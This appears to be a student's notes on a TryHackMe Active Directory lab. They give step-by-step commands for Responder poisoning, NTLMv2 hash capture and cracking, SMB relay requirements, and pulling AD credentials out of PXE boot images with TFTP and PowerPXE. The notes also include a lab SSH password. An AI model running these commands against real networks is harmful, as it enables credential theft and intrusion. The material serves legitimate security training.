## Part 1: Authentication Relays (SMB + Responder)

### SMB Protocol Overview

- **SMB (Server Message Block)** governs inter-network file sharing, remote administration, and printer communication in AD environments.
- When you authenticate to a server over SMB, NetNTLM challenges are transmitted.
- Two exploit avenues for NetNTLM authentication via SMB:
  1. **Intercept & Crack** — capture NetNTLM challenges and crack offline (slower than cracking raw NT hashes).
  2. **Relay** — man-in-the-middle the SMB authentication to gain an active authenticated session on the target server.

### LLMNR, NBT-NS, and WPAD Poisoning

Responder performs MitM attacks by poisoning responses during NetNTLM authentication:

| Protocol | Purpose |
|---|---|
| **LLMNR** (Link-Local Multicast Name Resolution) | Local DNS fallback — hosts ask the local network for name resolution |
| **NBT-NS** (NetBIOS Name Service) | Precursor to LLMNR — same purpose |
| **WPAD** (Web Proxy Auto-Discovery) | Finds a proxy for HTTP(S) connections |

These protocols rely on **broadcast requests** on the local network. Responder listens for these requests and sends **poisoned responses**, forcing clients to authenticate to the attacker's machine.

> [!WARNING]
> Poisoning authentication requests causes **normal authentication to fail** — users and services can't connect to their intended hosts. This is detectable and disruptive.

### Running Responder

```bash
sudo responder -I breachad
```

Leave Responder running (~10 minutes in the THM lab). When a simulated authentication attempt occurs, Responder captures the NTLMv2 hash:

```
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : <Client IP>
[SMBv2] NTLMv2-SSP Username : ZA\<Service Account Username>
[SMBv2] NTLMv2-SSP Hash     : <Service Account Username>::ZA:<NTLMv2-SSP Hash>
```

### Cracking the Captured Hash

Copy the NTLMv2-SSP hash to a file, then crack with Hashcat:

```bash
hashcat -m 5600 <hash file> <password file> --force
```

> Mode `5600` = NTLMv2-SSP

### SMB Relay Attack

Instead of cracking, you can **relay** the captured challenge to the target server:

![](attachments/Pasted%20image%2020261005165927.png)

**Requirements for a successful relay:**

| Requirement | Detail |
|---|---|
| **SMB Signing disabled** | If enabled, relayed messages can't be forged — server rejects them |
| **Account permissions** | The relayed account must have relevant permissions (ideally admin) on the target |
| **Guesswork** | Without prior AD enumeration, you must guess which accounts have which permissions |

## Part 2: Microsoft Deployment Toolkit (MDT) & PXE Boot

### Key Concepts

| Term | What It Is |
|---|---|
| **MDT** | Microsoft Deployment Toolkit — automates OS deployment from base images |
| **SCCM** | System Center Configuration Manager — manages software/updates post-deployment ("big brother" of MDT) |
| **PXE Boot** | Preboot Execution Environment — boots/installs an OS over the network (no USB/DVD needed) |
| **DHCP** | Provides network config + PXE boot info to new machines |
| **TFTP** | Trivial File Transfer Protocol — used to download boot images from MDT server |
| **BCD** | Boot Configuration Data — tells the boot process where/how to find the boot image |
| **WIM** | Windows Imaging Format — the actual bootable Windows deployment image |
| **Bootstrap.ini** | Deployment config file inside the WIM — may contain credentials |
| **PowerPXE** | PowerShell tool for PXE enumeration and credential extraction |

### MDT vs SCCM

```
MDT  → "Build/deploy the machine"
SCCM → "Manage the machine after deployment"
```

### Why Credentials End Up in PXE Boot Images

New machines need to automatically access the deployment share during installation → the deployment process requires credentials → if stored insecurely inside the WIM image, anyone who obtains the image can recover them.

### PXE Boot Process

![](attachments/Pasted%20image%2020261005174319.png)

Two exploitation paths:
1. **Inject a local admin account** — gain admin access once PXE boot completes.
2. **Password scraping** — recover AD credentials used during the install (our focus).

### Step-by-Step Walkthrough

#### Step 1 — Find MDT Server IP

```bash
nslookup thmmdt.za.tryhackme.com
```

Save the returned IP (e.g., `10.200.4.X`).

#### Step 2 — Find x64 BCD Filename

Open in browser: `http://pxeboot.za.tryhackme.com`

![](attachments/Pasted%20image%2020261005174332.png)

Copy the **exact** x64 BCD filename (e.g., `x64{ABC123...}.bcd`). The filename is dynamic — don't use placeholders.

> [!NOTE]
> If the network just started, BCD filenames only update after ~10 minutes.

#### Step 3 — SSH into THMJMP1

```bash
ssh thm@THMJMP1.za.tryhackme.com
# Password: Password1@
```

#### Step 4 — Create Working Directory

```cmd
cd Documents
mkdir <username>
copy C:\powerpxe <username>\
cd <username>
```

#### Step 5 — Download BCD via TFTP

```cmd
tftp -i <THMMDT-IP> GET "\Tmp\<X64-BCD-FILENAME>" conf.bcd
```

Expected: `Transfer successful: 12288 bytes`

Verify: `dir conf.bcd`

#### Step 6 — Start PowerShell & Import PowerPXE

```powershell
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
```

#### Step 7 — Find WIM Location

```powershell
Get-WimFile -bcdFile $BCDFile
```

Output:

```
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : <PXE Boot Image Location>
```

**Copy the WIM path** — it's determined from your actual BCD.

#### Step 8 — Download the WIM

```cmd
tftp -i <THMMDT-IP> GET "<PXE Boot Image Location>" pxeboot.wim
```

> This download takes several minutes — the WIM is a full Windows image (~340 MB).

Verify: `dir pxeboot.wim`

#### Step 9 — Extract Credentials from WIM

```powershell
Get-FindCredentials -WimFile pxeboot.wim
```

Output:

```
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = <account>
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = <password>
```

You now have another set of **AD credentials**.

## Why These Attacks Are Dangerous

> Centralized deployment infrastructure is a **high-value target** — it may contain credentials and configuration used to deploy thousands of machines. Compromising it can expose credentials or affect large portions of the organization's endpoint estate.
